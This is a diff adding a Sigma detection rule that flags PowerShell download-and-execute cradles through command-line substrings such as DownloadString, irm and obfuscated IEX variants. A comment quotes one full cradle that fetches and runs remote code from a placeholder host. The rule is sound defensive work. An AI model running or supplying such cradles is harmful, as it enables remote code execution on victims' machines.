@@ -1,0 +1,48 @@
+title: PowerShell Download and Execution Cradles
+id: 7c4af673-03d0-fd2c-2562-41ee96b4d36e
+related:
+    - id: 85b0b087-eddf-4a2b-b033-d771fa2b9775
+      type: derived
+status: test
+description: Detects PowerShell download and execution cradles.
+references:
+    - https://github.com/VirtualAlllocEx/Payload-Download-Cradles/blob/88e8eca34464a547c90d9140d70e9866dcbc6a12/Download-Cradles.cmd
+    - https://labs.withsecure.com/publications/fin7-target-veeam-servers
+author: Florian Roth (Nextron Systems)
+date: 2022-03-24
+modified: 2025-07-18
+tags:
+    - attack.execution
+    - attack.t1059
+logsource:
+    product: windows
+    category: process_creation
+detection:
+    process_creation:
+        EventID: 4688
+        Channel: Security
+    selection_download:
+        CommandLine|contains:
+            - .DownloadString(
+            - .DownloadFile(
+            - 'Invoke-WebRequest '
+            - 'iwr '
+            - 'Invoke-RestMethod '
+            - 'irm '  # powershell -ep bypass -w h -c irm test.domain/ffe | iex
+    selection_iex:
+        CommandLine|contains:
+            - ;iex $
+            - '| IEX'
+            - '|IEX '
+            - I`E`X
+            - I`EX
+            - IE`X
+            - 'iex '
+            - IEX (
+            - IEX(
+            - Invoke-Expression
+    condition: process_creation and (all of selection_*)
+falsepositives:
+    - Some PowerShell installers were seen using similar combinations. Apply filters accordingly
+level: high
+ruletype: Sigma
